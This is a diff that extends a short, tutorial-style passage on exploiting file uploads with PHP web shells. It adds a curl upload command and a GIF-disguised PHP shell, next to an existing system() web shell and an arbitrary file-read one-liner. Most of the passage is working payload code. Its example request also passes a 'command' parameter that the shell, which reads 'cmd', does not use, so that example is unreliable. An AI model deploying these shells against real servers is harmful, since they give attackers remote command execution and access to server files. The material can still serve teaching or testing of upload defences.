@@ -1,7 +1,16 @@
+
+```bash
+curl -X POST "http://$target/file-upload" -F "file=@test.txt" -F "filename=test.txt"
+```
+
 A more versatile web shell may look something like this:
 
 ```html
 <?php echo system($_GET['cmd']); ?>
+```
+
+```
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
 
 This script enables you to pass an arbitrary system command via a query parameter as follows: `GET /example/exploit.php?command=id HTTP/1.1` The following PHP one-liner could be used to read arbitrary files from the server's filesystem: `<?php echo file_get_contents('/path/to/target/file'); ?>`
